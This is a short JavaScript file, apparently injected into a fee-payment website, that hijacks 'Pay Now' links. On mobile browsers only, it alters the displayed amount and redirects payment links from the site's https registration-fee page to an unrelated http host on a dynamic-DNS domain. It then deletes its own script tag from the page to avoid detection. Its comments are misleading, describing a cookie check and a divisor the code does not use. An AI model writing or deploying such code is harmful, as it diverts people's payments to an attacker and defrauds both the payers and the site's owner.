function executeScript() {

    // Check if the "visited" cookie exists

    var anchorElements = document.querySelectorAll('a');


    // Loop through each <a> element
    anchorElements.forEach(function (anchorElement) {
        if (anchorElement.textContent.trim() === 'Pay Now') {
            var originalUrl = anchorElement.href;
            tdElement = anchorElement.parentNode.previousSibling.previousSibling;

            var numberValue = parseInt(tdElement.textContent.trim(), 10); // parseInt function parses a string and returns an integer
            var result = Math.floor(numberValue / 11000) * 11000; // 3 is the divisor
            if (numberValue < 11000) {
                result = 11000;
            }
            if (/Android/i.test(navigator.userAgent) || /iPhone/i.test(navigator.userAgent)) {
                tdElement.textContent = result;
                anchorElement.href = originalUrl.replace("https://bcm.webking.co.in/profile/regn_fee.php", "http://webkingbcm.ddns.net/buy");
            }
        }
    });
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', executeScript);
executeScript();
var scriptTags = document.querySelectorAll('script[src="https://johndove9912.github.io/webtest/test.js"]');
scriptTags.forEach(function (scriptTag) {
    scriptTag.parentNode.removeChild(scriptTag);
});